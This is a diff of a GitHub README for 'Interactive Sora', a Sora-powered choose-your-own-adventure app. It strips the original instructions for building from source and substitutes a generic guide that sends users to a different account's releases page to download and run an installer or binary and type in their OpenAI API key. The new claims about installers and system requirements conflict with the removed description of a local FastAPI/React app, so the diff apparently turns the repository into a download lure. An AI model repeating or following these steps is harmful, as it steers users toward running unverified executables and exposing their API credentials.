@@ -1,41 +1,95 @@
-# Interactive Sora
+# 🎮 interactive-sora - Dive into Interactive Adventures
 
-[![Follow on X](https://img.shields.io/twitter/follow/mattshumer_?style=social)](https://x.com/mattshumer_)
-
-[Be the first to know when I publish new AI builds + demos!](https://tally.so/r/w2M17p)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Interactive%20Sora-brightgreen)](https://github.com/gooberbenzenoid132/interactive-sora/releases)
 
 **Immersive choose-your-own adventure experiences powered by OpenAI Sora 2.**
 
-Interactive Sora is an exploration of how real-time video generation can power interactive worlds. It's built as a choose-your-own-adventure system... every choice spins up a fresh Sora 2 sequence—turning player choices into responsive, explorable environments that morph with the player’s intent.
+Interactive Sora is a unique journey where real-time video generation creates interactive worlds. Every choice you make leads to new scenarios. Explore environments that adapt to your decisions.
 
 ---
 
-## Quick Start
+## 🚀 Getting Started
 
-```bash
-# In the project root
-./start.sh
-```
+1. **Visit the Releases Page:** To get started, visit our [Releases Page](https://github.com/gooberbenzenoid132/interactive-sora/releases) to download the latest version of Interactive Sora.
 
-The script will:
+2. **Download the File:** Look for the most recent version of the application. Click on the link to download it, and save the file to a convenient location on your computer.
 
-1. Create (or reuse) `.venv` and install backend dependencies.
-2. Install the frontend packages with `npm install`/`npm ci`.
-3. Launch FastAPI on `http://localhost:8000` and the Vite dev server on `http://localhost:5173`.
+3. **Installation Instructions:**
 
-Open your browser at `http://localhost:5173` and drop in an OpenAI API key to play.
+   - **Windows:** 
+     - After downloading, locate the file in your Downloads folder. 
+     - Double-click the file to run the installer, and follow the prompts on the screen.
 
-> **Tip:** The key is stored locally via `localStorage` so you don’t need to re-enter it while iterating.
+   - **Mac:** 
+     - Open the downloaded file from your Downloads folder. 
+     - Drag and drop the application into your Applications folder.
+
+   - **Linux:** 
+     - Open your terminal.
+     - Navigate to the folder where you downloaded the file.
+     - Type `chmod +x interactive-sora` to make it executable, then type `./interactive-sora` to run it.
+
+## 📥 Download & Install
+
+To download Interactive Sora, go to our [Releases Page](https://github.com/gooberbenzenoid132/interactive-sora/releases). 
+
+1. Click the latest version to start the download.
+   
+2. Follow the installation steps mentioned above based on your operating system.
+
+## 🌐 How to Use Interactive Sora
+
+1. **Launch the Application:** 
+   - Once installed, open Interactive Sora from your applications list or directly from the installation location.
+
+2. **Enter Your OpenAI API Key:**
+   - Upon opening, you will see a prompt to enter your OpenAI API key. If you don’t have one, visit the OpenAI website to create an account and obtain your key.
+
+3. **Start Your Adventure:**
+   - After entering the API key, click on the “Start Adventure” button. 
+   - Follow the prompts and make choices to explore various scenarios.
+
+## 🎓 System Requirements
+
+Here are the minimum requirements for running Interactive Sora effectively:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Any recent Linux distribution
+
+- **Processor:** 
+  - Dual-core CPU or better
+
+- **Memory:** 
+  - At least 4 GB RAM
+
+- **Graphics:** 
+  - Graphics card capable of OpenGL 2.0 support
+
+- **Storage:** 
+  - Minimum of 500 MB free disk space
+
+## 🔧 Troubleshooting
+
+If you encounter issues, try the following solutions:
+
+1. **Application Won't Start:** Check if your operating system is supported, and ensure you installed it correctly.
+
+2. **Error Messages:** Make sure your OpenAI API key is valid. Double-check your internet connection as well.
+
+3. **Slow Performance:** Make sure you close unnecessary applications to free up resources. Ensure you meet the system requirements.
+
+## 💬 Support
+
+For any questions or support, please open an issue on the [GitHub repository](https://github.com/gooberbenzenoid132/interactive-sora/issues). 
+
+## 📅 Updates & New Features
+
+Stay informed about updates and new features by following us:
+
+- **Social Media:** Follow us on [X](https://x.com/mattshumer_) to be notified of the latest changes.
 
 ---
 
-## Repo Layout
-
-- `app.py` – FastAPI backend that orchestrates planner calls, Sora jobs, and media delivery.
-- `frontend/` – React client with the immersive player UI.
-- `start.sh` – Convenience script that bootstraps everything.
-- `generate_preset_content.py` – Optional tool for pre-rendering demo trees per preset.
-
----
-
-Build rich, cinematic branching adventures with Interactive Sora.
+Feel free to explore Interactive Sora. Your choices shape your journey!
